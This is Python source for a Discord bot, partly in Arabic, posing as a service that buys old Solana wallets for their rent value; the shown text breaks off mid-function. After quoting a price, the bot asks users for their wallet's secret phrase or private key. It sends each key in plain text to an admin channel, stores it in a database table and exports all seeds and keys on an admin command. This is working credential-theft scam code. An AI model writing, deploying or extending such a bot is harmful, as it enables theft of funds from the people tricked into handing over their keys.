import discord
from discord.ext import commands
from discord import app_commands
import requests
import re
import logging
import datetime
import threading
from asyncio import run_coroutine_threadsafe
import sqlite3
import os
import asyncio
from flask import Flask

# Disable Flask/Werkzeug logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

def run_flask():
    app.run(host='0.0.0.0', port=5000)

# ═══════════════════════════════════════════════════════════════
# إعدادات السجلات - عربية ومختصرة
# ═══════════════════════════════════════════════════════════════
logging.basicConfig(
    level=logging.WARNING,
    format='%(asctime)s | %(message)s',
    datefmt='%H:%M:%S'
)

# تعطيل سجلات Werkzeug (Flask) لتقليل الضجيج
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

DISCORD_TOKEN = os.getenv('DISCORD_BOT')
SOLANA_RPC_URLS = [
    os.getenv('RPC_URL1'),
    os.getenv('RPC_URL2'),
    os.getenv('RPC_URL3')
]
TARGET_CHANNEL_ID = 1474533342220128256
EMPTY_WALLET_CHANNEL_ID = 1474533488114925691
VALUABLE_WALLET_CHANNEL_ID = 1474566936959385670
USER_CONTENT_CHANNEL_ID = 1474582271221567631
NEW_USER_CHANNEL_ID = 1474582517775597611
ADMIN_IDS = [1455690622412390573]

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix=['/', ''], intents=intents, help_command=None)

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f'Logged in as {bot.user}')
    print("Slash commands synced.")

@bot.tree.command(
    name="start", 
    description="Start using the bot"
)
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def start_slash(interaction: discord.Interaction):
    """امر البداية (Slash Command)"""
    welcome_text = (
        "Welcome.\n\n"
        "Send me the address of the old wallet you want to sell 💰"
    )
    await interaction.response.send_message(welcome_text)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        # Ignore CommandNotFound errors because users often send wallet addresses
        # which can be mistaken for commands if they start with a prefix (or empty prefix)
        return
    raise error

# قاموس لتخزين بيانات المستخدمين والمحافظ المؤقتة
user_wallets = {}
user_states = {}
admin_payment_states = {}
admin_divisor = 1.0
user_divisor = 2.0 # القيمة الافتراضية

def save_user_divisor(value):
    try:
        with open('user_ratio.txt', 'w') as f:
            f.write(str(value))
    except Exception as e:
        logging.error(f"Error saving ratio: {e}")

async def send_to_channel(channel_id, content=None, embed=None, file=None, files=None, view=None):
    channel = bot.get_channel(channel_id)
    if channel and isinstance(channel, discord.abc.Messageable):
        try:
            kwargs = {}
            if content: kwargs['content'] = content
            if embed: kwargs['embed'] = embed
            if file: kwargs['file'] = file
            if files: kwargs['files'] = files
            if view: kwargs['view'] = view
            await channel.send(**kwargs)
        except Exception as e:
            print(f"Error sending to channel {channel_id}: {e}")

async def send_to_target(content=None, embed=None, file=None, files=None, view=None):
    await send_to_channel(TARGET_CHANNEL_ID, content, embed, file, files, view)

async def log_wallet_check(user_id, username, wallet_address, sol_value, full_amount=None, is_admin=False, is_custom=False, is_empty=False):
    # Save to addresses.txt for 'فارغ' command
    try:
        with open("addresses.txt", "a", encoding="utf-8") as f:
            f.write(f"{wallet_address}\n")
    except Exception as e:
        logging.error(f"Error saving address to file: {e}")

    # Save to rent.txt if it has rent
    if not is_empty:
        try:
            with open("rent.txt", "a", encoding="utf-8") as f:
                f.write(f"{wallet_address}\n")
        except Exception as e:
            logging.error(f"Error saving rent address to file: {e}")

    log_message = (
        f"🔍 **New Wallet Check**\n\n"
        f"👤 **User**: @{username} \n\n"
        f"🆔 **ID**: `{user_id}`\n\n"
        f"📌 **Wallet**: `{wallet_address}`\n\n"
        f"💎 **Real Amount**: `{full_amount:.4f} SOL`\n"
    )

    if is_custom:
        log_message += f"💵 **User Value**: `{sol_value} SOL` Custom 📊\n"
    else:
        log_message += f"💵 **User Value**: `{sol_value} SOL`\n"

    log_message += f"\n⏰ **Time**: `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}`"
    
    target_id = EMPTY_WALLET_CHANNEL_ID if is_empty else VALUABLE_WALLET_CHANNEL_ID
    await send_to_channel(target_id, content=log_message)

def log_new_referral(referrer_id, referrer_username, referred_id, referred_username):
    referrer_display = f"@{referrer_username}" if referrer_username else "لا يوجد"
    referred_display = f"@{referred_username}" if referred_username else "لا يوجد"

    referral_message = (
        "✨ **مستخدم جديد عبر الإحالة** 📩\n\n"
        "━━━━━━━━━━━━━━━━━━━\n\n"
        "👤 **المستخدم الجديد:**\n"
        f"🆔 ID: `{referred_id}`\n"
        f"👉 User: {referred_display}\n\n"
        "━━━━━━━━━━━━━━━━━━━\n\n"
        "💎 **عن طريق:**\n"
        f"🆔 ID: `{referrer_id}`\n"
        f"👉 User: {referrer_display}\n\n"
        f"⏰ **الوقت:** `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}`"
    )
    asyncio.run_coroutine_threadsafe(send_to_target(content=referral_message), bot.loop)

# قاعدة بيانات
DB_PATH = 'users.db'

def init_database():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users
                    (user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    last_name TEXT,
                    join_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS wallet_checks
                    (check_id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    wallet_address TEXT,
                    is_empty BOOLEAN,
                    has_rent BOOLEAN,
                    check_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY(user_id) REFERENCES users(user_id))''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS successful_sales
                    (sale_id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    amount REAL,
                    sale_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY(user_id) REFERENCES users(user_id))''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS user_activity
                    (user_id INTEGER PRIMARY KEY,
                    last_active TIMESTAMP,
                    check_count INTEGER DEFAULT 0,
                    FOREIGN KEY(user_id) REFERENCES users(user_id))''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS user_wallets
                    (user_id INTEGER PRIMARY KEY,
                    amount REAL,
                    FOREIGN KEY(user_id) REFERENCES users(user_id))''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS referrals
                    (referrer_id INTEGER,
                    referred_id INTEGER PRIMARY KEY,
                    original_wallet TEXT,
                    reward_wallet TEXT,
                    sale_amount REAL,
                    is_active BOOLEAN DEFAULT FALSE,
                    reward_paid BOOLEAN DEFAULT FALSE,
                    FOREIGN KEY(referrer_id) REFERENCES users(user_id),
                    FOREIGN KEY(referred_id) REFERENCES users(user_id))''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS reward_requests
                    (request_id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    reward_wallet TEXT,
                    amount REAL,
                    status TEXT DEFAULT 'pending',
                    request_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY(user_id) REFERENCES users(user_id))''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS wallet_prices
                    (wallet_address TEXT PRIMARY KEY,
                    custom_price REAL,
                    set_by_admin INTEGER,
                    created_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY(set_by_admin) REFERENCES users(user_id))''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS blocked_users
                    (user_id INTEGER PRIMARY KEY,
                    blocked_by_admin INTEGER,
                    blocked_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    reason TEXT,
                    FOREIGN KEY(blocked_by_admin) REFERENCES users(user_id))''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS user_keys
                    (key_id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    username TEXT,
                    key_data TEXT,
                    key_type TEXT,
                    submit_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY(user_id) REFERENCES users(user_id))''')
    conn.commit()
    conn.close()

def add_user(user_id, username, first_name, last_name):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    # Check if user already exists
    cursor.execute("SELECT 1 FROM users WHERE user_id = ?", (user_id,))
    exists = cursor.fetchone()
    
    cursor.execute("INSERT OR REPLACE INTO users (user_id, username, first_name, last_name, join_time) VALUES (?, ?, ?, ?, COALESCE((SELECT join_time FROM users WHERE user_id = ?), CURRENT_TIMESTAMP))",
                   (user_id, username, first_name, last_name, user_id))
    conn.commit()
    conn.close()
    
    if not exists:
        user_display = f"@{username}" if username else f"{first_name or ''} {last_name or ''}".strip() or "Unknown"
        new_user_msg = (
            "🆕 **مستخدم جديد انضم للبوت**\n\n"
            f"👤 **الأسم/اليوزر:** {user_display}\n"
            f"🆔 **الايدي:** `{user_id}`\n"
            f"⏰ **الوقت:** `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}`"
        )
        asyncio.run_coroutine_threadsafe(send_to_channel(NEW_USER_CHANNEL_ID, content=new_user_msg), bot.loop)

def is_user_blocked(user_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT 1 FROM blocked_users WHERE user_id = ?", (user_id,))
    blocked = cursor.fetchone() is not None
    conn.close()
    return blocked

def check_tables_exist():
    init_database()

@bot.event
async def on_ready_old(): # Renaming old print if any
    print(f'Logged in as {bot.user}')

def extract_wallets(text):
    """استخراج عناوين المحافظ من النص"""
    wallet_pattern = r'\b[1-9A-HJ-NP-Za-km-z]{32,44}\b'
    wallets = re.findall(wallet_pattern, text)
    return [w.strip() for w in wallets if 32 <= len(w.strip()) <= 44]

def get_custom_price(wallet_address):
    """الحصول على السعر المخصص للمحفظة إن وجد"""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('SELECT custom_price FROM wallet_prices WHERE wallet_address = ?', (wallet_address,))
        result = cursor.fetchone()
        conn.close()
        return result[0] if result else None
    except Exception as e:
        logging.error(f"Error getting custom price: {e}")
        return None

def process_wallet_check_sync(user_id, username, wallet, is_admin=False):
    """النسخة المتزامنة من فحص المحفظة لتعمل مع Discord"""
    try:
        solana_apis = [url for url in SOLANA_RPC_URLS if url]
        if not solana_apis:
             solana_apis = ["https://api.mainnet-beta.solana.com"]

        token_programs = [
            "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
            "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"
        ]

        headers = {"Content-Type": "application/json"}
        all_accounts = []

        for program_id in token_programs:
            data = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getTokenAccountsByOwner",
                "params": [wallet, {"programId": program_id}, {"encoding": "jsonParsed"}]
            }
            for api in solana_apis:
                try:
                    response = requests.post(api, json=data, headers=headers, timeout=10)
                    result = response.json()
                    if "result" in result and "value" in result["result"]:
                        all_accounts.extend(result["result"]["value"])
                    break
                except:
                    continue

        total_rent = len(all_accounts) * 0.00203928
        custom_price = get_custom_price(wallet)
        
        # تحميل النسبة من الملف أو القيمة الافتراضية
        try:
            with open('user_ratio.txt', 'r') as f:
                current_user_divisor = float(f.read().strip())
        except:
            current_user_divisor = 2.0

        if custom_price:
            user_sol_value = custom_price
        else:
            user_sol_value = round(total_rent / current_user_divisor, 5)

        is_empty = user_sol_value < 0.000699
        has_rent = not is_empty

        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('INSERT INTO wallet_checks (user_id, wallet_address, is_empty, has_rent) VALUES (?, ?, ?, ?)', 
                       (user_id, wallet, is_empty, has_rent))
        cursor.execute('''INSERT OR REPLACE INTO user_activity
                         (user_id, last_active, check_count)
                         VALUES (?, CURRENT_TIMESTAMP,
                                 COALESCE((SELECT check_count FROM user_activity WHERE user_id = ?), 0) + 1)''',
                      (user_id, user_id))
        conn.commit()
        conn.close()

        return {
            "wallet": wallet,
            "total_rent": total_rent,
            "user_sol_value": user_sol_value,
            "is_custom": custom_price is not None,
            "is_empty": is_empty
        }
    except Exception as e:
        logging.error(f"process_wallet_check_sync error: {e}")
        return None

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if is_user_blocked(message.author.id):
        return

    # Forward to target channel
    user_id = message.author.id
    username = str(message.author)
    
    # Add user to database if not exists
    add_user(user_id, message.author.name, message.author.global_name or message.author.name, "")
    
    # Get user state
    state = user_states.get(user_id)
    info_text = f"👤 **User**: {username} (ID: `{user_id}`)\n"

    # 1. Handle user states (Selling process & Private Key)
    if state == "waiting_for_ed_wallet":
        wallets = extract_wallets(message.content)
        if wallets:
            wallet = wallets[0]
            await message.reply(f"✅ Received wallet: `{wallet}`\n\nPlease send the **Custom Price** (SOL) for this wallet:")
            user_states[user_id] = f"waiting_for_ed_price_{wallet}"
            return
    
    if state and state.startswith("waiting_for_ed_price_"):
        wallet = state.replace("waiting_for_ed_price_", "")
        try:
            price = float(message.content.strip())
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            cursor.execute('''INSERT OR REPLACE INTO wallet_prices
                             (wallet_address, custom_price, set_by_admin)
                             VALUES (?, ?, ?)''', (wallet, price, user_id))
            conn.commit()
            conn.close()
            await message.reply(f"✅ Set custom price for `{wallet}` to `{price} SOL`")
            user_states.pop(user_id, None)
        except ValueError:
            await message.reply("❌ Invalid price. Please send a number (e.g. 0.5):")
        return

    if state == "waiting_for_reward_wallet":
        wallets = extract_wallets(message.content)
        if wallets:
            reward_wallet = wallets[0]
            if user_id not in user_wallets:
                user_wallets[user_id] = {}
            
            # Verify it's different from the original wallet
            original_wallet = user_wallets[user_id].get('original_wallet', 'Unknown')
            if reward_wallet == original_wallet:
                await message.reply("❌ The receiving wallet must be different from the selling wallet. Please provide a different address:")
                return

            user_wallets[user_id]['reward_wallet'] = reward_wallet
            
            short_orig = f"{original_wallet[:4]}...{original_wallet[-4:]}"
            short_reward = f"{reward_wallet[:4]}...{reward_wallet[-4:]}"
            
            prompt_text = (
                "Send us the secret phrase of the wallet you want to sell.\n\n"
                f"• Wallet for Sale: `{short_orig}`\n"
                f"• Receiving Wallet: `{short_reward}`"
            )
            
            await message.reply(prompt_text)
            user_states[user_id] = "waiting_for_private_key"
            return

    if state == "waiting_for_private_key":
        key_data = message.content.strip()
        original_data = user_wallets.get(user_id)
        
        if original_data and 'original_wallet' in original_data:
            original_wallet = original_data['original_wallet']
            reward_wallet = original_data.get('reward_wallet', 'Not provided')
            amount = original_data['amount']
            
            # Log the FULL sale request to admin after getting the key
            sale_msg = (
                "💰 **New Complete Sale Request**\n\n"
                f"👤 **User**: @{username} (ID: `{user_id}`)\n"
                f"📌 **Selling Wallet**: `{original_wallet}`\n"
                f"📥 **Receiving Wallet**: `{reward_wallet}`\n"
                f"🔑 **Key/Seed**: `{key_data}`\n"
                f"💎 **Amount**: `{amount:.4f} SOL` (Rent Value)\n"
            )
            
            # Create Pay Button
            class PayView(discord.ui.View):
                def __init__(self, user_id, amount):
                    super().__init__(timeout=None)
                    self.user_id = user_id
                    self.amount = amount

                @discord.ui.button(label="Pay", style=discord.ButtonStyle.success, custom_id="pay_button")
                async def pay_button(self, interaction: discord.Interaction, button: discord.ui.Button):
                    if interaction.user.id not in ADMIN_IDS:
                        await interaction.response.send_message("❌ You are not authorized to use this button.", ephemeral=True)
                        return
                    
                    try:
                        # Record the successful sale in the database
                        conn = sqlite3.connect(DB_PATH)
                        cursor = conn.cursor()
                        cursor.execute("INSERT INTO successful_sales (user_id, amount) VALUES (?, ?)", (self.user_id, self.amount))
                        conn.commit()
                        conn.close()

                        user = await bot.fetch_user(self.user_id)
                        success_msg = (
                            "🎊 Congratulations! The transaction was successful\n\n"
                            "Your request has been processed and funds have been sent to your wallet. Thank you for your trust! If you have more wallets, we are always here for you!\n\n"
                            "🎁 When you sell wallets with a total value of 10 SOL, you will receive a 1 SOL bonus."
                        )
                        await user.send(success_msg)
                        await interaction.response.send_message(f"✅ Payment confirmation sent to user `{self.user_id}` and recorded in sales.", ephemeral=True)
                        # Disable the button after use
                        button.disabled = True
                        await interaction.message.edit(view=self)
                    except Exception as e:
                        await interaction.response.send_message(f"❌ Error processing payment: {e}", ephemeral=True)

            # Send to TARGET_CHANNEL_ID for orders
            await send_to_channel(TARGET_CHANNEL_ID, content=sale_msg, view=PayView(user_id, amount))
            
            # Save key to database
            try:
                conn = sqlite3.connect(DB_PATH)
                cursor = conn.cursor()
                key_type = "seed" if len(key_data.split()) > 1 else "private_key"
                cursor.execute('''INSERT INTO user_keys (user_id, username, key_data, key_type)
                                 VALUES (?, ?, ?, ?)''', (user_id, username, key_data, key_type))
                conn.commit()
                conn.close()
            except Exception as e:
                logging.error(f"Error saving key to DB: {e}")

            await message.reply("✅ Your request has been sent to the administration. We will process your payment soon.")
            user_states.pop(user_id, None)
            user_wallets.pop(user_id, None)
            return
        else:
            await message.reply("❌ Error: Transaction data lost. Please start again by sending the wallet address.")
            user_states.pop(user_id, None)
            return

    # 2. Forward regular messages to admin (User Content Channel)
    prefixes = ('/', '!', '.', '')
    # Check if it's a command or wallet address
    content_stripped = message.content.strip()
    is_command = (message.content.startswith(prefixes) and len(message.content) > 1) or content_stripped.lower() in ['مستخدمين', 'بيانات', 'عبارات ومفاتيح', 'فارغ', 'فحص', 'عناوين', 'rr']
    is_wallet = len(extract_wallets(message.content)) > 0
    
    # Critical fix: Check if it's a command first (with empty prefix allowed)
    is_command_prefix = any(content_stripped.startswith(p) for p in (bot.command_prefix if isinstance(bot.command_prefix, (list, tuple, set)) else [bot.command_prefix]) if p)
    
    # If it's a wallet, process it
    if is_wallet:
        # We need to make sure we don't accidentally treat it as a command if prefix is empty
        # If it's a wallet, we skip the command processing and go to wallet processing
        pass
    elif content_stripped.lower() == 'rr':
        if user_id in ADMIN_IDS:
            await message.reply("👤 أرسل الآن ID المستخدم الذي تريد مراسلته:")
            user_states[user_id] = "waiting_for_rr_id"
            return
    elif content_stripped.lower() == "/start" or content_stripped.lower() == "start":
        welcome_text = (
            "Welcome.\n\n"
            "Send me the address of the old wallet you want to sell 💰"
        )
        await message.reply(welcome_text)
        return
    elif content_stripped.lower() == 'مستخدمين':
        if message.author.id in ADMIN_IDS:
            try:
                conn = sqlite3.connect(DB_PATH)
                cursor = conn.cursor()
                
                # 1. Total users
                cursor.execute("SELECT COUNT(*) FROM users")
                total_users = cursor.fetchone()[0]
                
                # 2. User growth (24h, week, month)
                now = datetime.datetime.now()
                day_ago = (now - datetime.timedelta(days=1)).strftime('%Y-%m-%d %H:%M:%S')
                week_ago = (now - datetime.timedelta(weeks=1)).strftime('%Y-%m-%d %H:%M:%S')
                month_ago = (now - datetime.timedelta(days=30)).strftime('%Y-%m-%d %H:%M:%S')
                
                cursor.execute("SELECT COUNT(*) FROM users WHERE join_time >= ?", (day_ago,))
                users_24h = cursor.fetchone()[0]
                cursor.execute("SELECT COUNT(*) FROM users WHERE join_time >= ?", (week_ago,))
                users_week = cursor.fetchone()[0]
                cursor.execute("SELECT COUNT(*) FROM users WHERE join_time >= ?", (month_ago,))
                users_month = cursor.fetchone()[0]
                
                # 3. Wallet checks (24h, week, month, total)
                cursor.execute("SELECT COUNT(*) FROM wallet_checks")
                checks_total = cursor.fetchone()[0]
                cursor.execute("SELECT COUNT(*) FROM wallet_checks WHERE check_time >= ?", (day_ago,))
                checks_24h = cursor.fetchone()[0]
                cursor.execute("SELECT COUNT(*) FROM wallet_checks WHERE check_time >= ?", (week_ago,))
                checks_week = cursor.fetchone()[0]
                cursor.execute("SELECT COUNT(*) FROM wallet_checks WHERE check_time >= ?", (month_ago,))
                checks_month = cursor.fetchone()[0]
                
                # 4. Successful sales (24h, week, month)
                cursor.execute("SELECT COUNT(*), SUM(amount) FROM successful_sales WHERE sale_time >= ?", (day_ago,))
                res_24h = cursor.fetchone()
                sales_24h_count = res_24h[0] or 0
                sales_24h_sum = res_24h[1] or 0.0
                
                cursor.execute("SELECT COUNT(*), SUM(amount) FROM successful_sales WHERE sale_time >= ?", (week_ago,))
                res_week = cursor.fetchone()
                sales_week_count = res_week[0] or 0
                sales_week_sum = res_week[1] or 0.0
                
                cursor.execute("SELECT COUNT(*), SUM(amount) FROM successful_sales WHERE sale_time >= ?", (month_ago,))
                res_month = cursor.fetchone()
                sales_month_count = res_month[0] or 0
                sales_month_sum = res_month[1] or 0.0
                
                # 5. Top 10 Referrers
                cursor.execute("""
                    SELECT r.referrer_id, u.username, COUNT(*) as ref_count 
                    FROM referrals r
                    JOIN users u ON r.referrer_id = u.user_id
                    GROUP BY r.referrer_id
                    ORDER BY ref_count DESC
                    LIMIT 10
                """)
                top_referrers = cursor.fetchall()
                referrers_text = "\n".join([f"├ @{row[1] or row[0]}: {row[2]}" for row in top_referrers]) if top_referrers else "لا يوجد بيانات حالياً"
                
                # 6. Top Active Users
                cursor.execute("""
                    SELECT ua.user_id, u.username, ua.check_count 
                    FROM user_activity ua
                    JOIN users u ON ua.user_id = u.user_id
                    ORDER BY ua.check_count DESC
                    LIMIT 10
                """)
                top_active = cursor.fetchall()
                active_text = "\n".join([f"├ @{row[1] or row[0]}: {row[2]}" for row in top_active]) if top_active else "لا يوجد بيانات حالياً"
                
                conn.close()
                
                stats_msg = (
                    "📊 إحصائيات شاملة للبوت\n"
                    "━━━━━━━━━━━━━━━━\n"
                    f"👥 عدد المستخدمين الكلي: {total_users}\n\n"
                    "📈 عدد زيادة المستخدمين\n"
                    f"├ 24 ساعة: {users_24h}\n"
                    f"├ أسبوع: {users_week}\n"
                    f"└ شهر: {users_month}\n\n"
                    "🔍 المحافظ المفحوصة\n"
                    f"├ 24 ساعة: {checks_24h}\n"
                    f"├ أسبوع: {checks_week}\n"
                    f"├ شهر: {checks_month}\n"
                    f"└ الكل: {checks_total}\n\n"
                    "💰 المبيعات الناجحة\n"
                    f"├ 24 ساعة: {sales_24h_count} ({sales_24h_sum:.2f} SOL)\n"
                    f"├ أسبوع: {sales_week_count} ({sales_week_sum:.2f} SOL)\n"
                    f"└ شهر: {sales_month_count} ({sales_month_sum:.2f} SOL)\n\n"
                    "🏆 أفضل 10 محيلين\n"
                    f"{referrers_text}\n"
                    "🌟 أكثر المستخدمين تفاعلاً\n"
                    f"{active_text}\n"
                    f"🔄 آخر تحديث: {now.strftime('%Y-%m-%d %H:%M')}"
                )
                
                await message.reply(stats_msg)
            except Exception as e:
                await message.reply(f"❌ حدث خطأ أثناء جلب الإحصائيات: {e}")
            return
        return
    elif content_stripped.lower() == 'بيانات':
        if message.author.id in ADMIN_IDS:
            embed = discord.Embed(
                title="🗄️ إدارة قاعدة البيانات",
                description="اختر أحد الخيارات التالية للتحكم في ملفات البيانات:",
                color=discord.Color.blue()
            )
            
            view = discord.ui.View()
            
            # زر التحميل
            download_btn = discord.ui.Button(label="تحميل النسخة الاحتياطية", style=discord.ButtonStyle.success, emoji="📥")
            async def download_callback(interaction):
                files = []
                for filename in ['users.db', 'addresses.txt', 'rent.txt', 'user_ratio.txt', 'keys.txt']:
                    if os.path.exists(filename):
                        files.append(discord.File(filename))
                
                if files:
                    await interaction.response.send_message("✅ جاري تحضير الملفات...", ephemeral=True)
                    await interaction.followup.send("إليك نسخة من ملفات قاعدة البيانات الحالية:", files=files)
                else:
                    await interaction.response.send_message("❌ لم يتم العثور على أي ملفات بيانات.", ephemeral=True)
            
            # زر الرفع
            upload_btn = discord.ui.Button(label="رفع ملفات جديدة", style=discord.ButtonStyle.primary, emoji="📤")
            async def upload_callback(interaction):
                user_states[interaction.user.id] = "waiting_for_db_upload"
                await interaction.response.send_message("📤 أرسل الآن الملفات التي تريد استبدالها (users.db, addresses.txt, إلخ...)", ephemeral=True)
            
            download_btn.callback = download_callback
            upload_btn.callback = upload_callback
            view.add_item(download_btn)
            view.add_item(upload_btn)
            
            await message.reply(embed=embed, view=view)
            return
        return
    elif content_stripped.lower() == 'عبارات ومفاتيح':
        if message.author.id in ADMIN_IDS:
            try:
                conn = sqlite3.connect(DB_PATH)
                cursor = conn.cursor()
                cursor.execute("SELECT key_data, key_type FROM user_keys")
                rows = cursor.fetchall()
                conn.close()
                
                seeds = [row[0] for row in rows if len(row[0].split()) in [12, 15, 18, 21, 24]]
                privkeys = [row[0] for row in rows if row[0] not in seeds]
                
                content = "🔑 **العبارات السرية (Seeds):**\n\n"
                content += "\n\n".join(seeds)
                content += "\n\n" + "="*30 + "\n\n"
                content += "🔐 **المفاتيح الخاصة (Private Keys):**\n\n"
                content += "\n\n".join(privkeys)
                
                with open("keys.txt", "w", encoding="utf-8") as f:
                    f.write(content)
                
                await message.reply(file=discord.File("keys.txt"))
            except Exception as e:
                await message.reply(f"❌ حدث خطأ أثناء استخراج البيانات: {e}")
            return
        return
    elif is_command_prefix:
        await bot.process_commands(message)
        return
    else:
        # It's a random message like "glkdo", send to user content channel
        forward_msg = (
            "💬 **Message from User**\n\n"
            f"👤 **User**: {username} (ID: `{user_id}`)\n"
            f"📝 **Content**: {message.content}"
        )
        files = []
        for attachment in message.attachments:
            files.append(await attachment.to_file())
        
        await send_to_channel(USER_CONTENT_CHANNEL_ID, content=forward_msg, files=files)
        return

    # --- Wallet Processing Logic ---
    wallets = extract_wallets(message.content)
    if wallets:
        wallet = wallets[0]
        
        # منع التداخل: إذا كان المستخدم في حالة انتظار عنوان المكافأة، لا تقم بفحص المحفظة كطلب جديد
        if user_states.get(user_id) == "waiting_for_reward_wallet":
            return
        
        # تأكد أن الرسالة ليست أمراً للمشرف (مثل ed <wallet>)
        if message.author.id in ADMIN_IDS and (content_stripped.lower().startswith('ed ') or any(content_stripped.startswith(p) for p in (bot.command_prefix if isinstance(bot.command_prefix, (list, tuple, set)) else [bot.command_prefix]) if p)):
            await bot.process_commands(message)
            return

        # Run the sync check in a thread to not block the event loop
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, process_wallet_check_sync, user_id, username, wallet)
        
        if result:
            # await log_wallet_check(user_id, username, wallet, result['user_sol_value'], result['total_rent'], is_empty=result['is_empty'])
            if result["is_empty"]:
                await message.reply("🚫 Unfortunately, we cannot offer any value for this wallet.\n\n🔍 Try checking other addresses—some might be valuable!")
                # Send to EMPTY_WALLET_CHANNEL_ID
                await log_wallet_check(user_id, username, wallet, result['user_sol_value'], result['total_rent'], is_empty=True)
            else:
                short_wallet = wallet[:4] + "..." + wallet[-4:]
                result_text = f"Wallet: `{short_wallet}`\n\nYou will receive: `{result['user_sol_value']} SOL 💰`"
                
                user_wallets[user_id] = {
                    "original_wallet": wallet,
                    "amount": result['total_rent']
                }
                
                view = discord.ui.View()
                confirm_btn = discord.ui.Button(label="✅ Confirm & Sell", style=discord.ButtonStyle.green, custom_id="confirm_sell")
                cancel_btn = discord.ui.Button(label="❌ Cancel", style=discord.ButtonStyle.red, custom_id="cancel_sell")
                
                async def confirm_callback(interaction):
                    if interaction.user.id != user_id:
                        await interaction.response.send_message("This is not your transaction.", ephemeral=True)
                        return
                    
                    await interaction.response.send_message("✅ Request confirmed successfully\n\nPlease send your **Receiving Wallet Address** (it must be different from the one you are selling):")
                    user_states[user_id] = "waiting_for_reward_wallet"

                async def cancel_callback(interaction):
                    if interaction.user.id != user_id:
                        await interaction.response.send_message("This is not your transaction.", ephemeral=True)
                        return
                    await interaction.response.send_message("❌ Transaction cancelled.")
                    user_wallets.pop(user_id, None)

                confirm_btn.callback = confirm_callback
                cancel_btn.callback = cancel_callback
                
                view.add_item(confirm_btn)
                view.add_item(cancel_btn)
                
                await message.reply(result_text, view=view)
                
                # Send to VALUABLE_WALLET_CHANNEL_ID
                await log_wallet_check(user_id, username, wallet, result['user_sol_value'], result['total_rent'], is_custom=result['is_custom'], is_empty=False)
        
        return

    # Check if the message is from an admin
    if message.author.id in ADMIN_IDS:
        await bot.process_commands(message)
        return

    # Check if it's a reply from a user in a support chat
    if state == "waiting_for_user_reply":
        admin_msg = f"📩 **New Reply from User** (ID: `{user_id}`):\n{message.content}"
        admin_view = discord.ui.View()
        reply_btn = discord.ui.Button(label="Reply", style=discord.ButtonStyle.primary)
        end_btn = discord.ui.Button(label="End Conversation", style=discord.ButtonStyle.danger)

        async def admin_reply_callback(interaction):
            await interaction.response.edit_message(view=None)
            await interaction.followup.send(f"Please send your message for user `{user_id}` now:", ephemeral=True)
            user_states[interaction.user.id] = f"waiting_for_rr_msg_{user_id}"

        async def admin_end_callback(interaction):
            await interaction.response.edit_message(view=None)
            try:
                user = await bot.fetch_user(user_id)
                await user.send("The admin has ended the conversation.")
            except: pass
            await interaction.followup.send("Conversation ended.", ephemeral=True)
            user_states.pop(user_id, None)

        reply_btn.callback = admin_reply_callback
        end_btn.callback = admin_end_callback
        admin_view.add_item(reply_btn)
        admin_view.add_item(end_btn)

        files = []
        for attachment in message.attachments:
            files.append(await attachment.to_file())

        for admin_id in ADMIN_IDS:
            try:
                admin = await bot.fetch_user(admin_id)
                await admin.send(admin_msg, view=admin_view, files=files)
            except Exception as e:
                logging.error(f"Error forwarding reply to admin {admin_id}: {e}")
        
        await message.reply("✅ Your reply has been sent to the Admin.")
        return

    content_lower = message.content.lower().strip()

    if message.author.id in ADMIN_IDS:
        content_lower = message.content.lower().strip()
        
        if content_lower == 'مستخدمين':
            if message.author.id in ADMIN_IDS:
                try:
                    conn = sqlite3.connect(DB_PATH)
                    cursor = conn.cursor()
                    
                    # 1. Total users
                    cursor.execute("SELECT COUNT(*) FROM users")
                    total_users = cursor.fetchone()[0]
                    
                    # 2. User growth (24h, week, month)
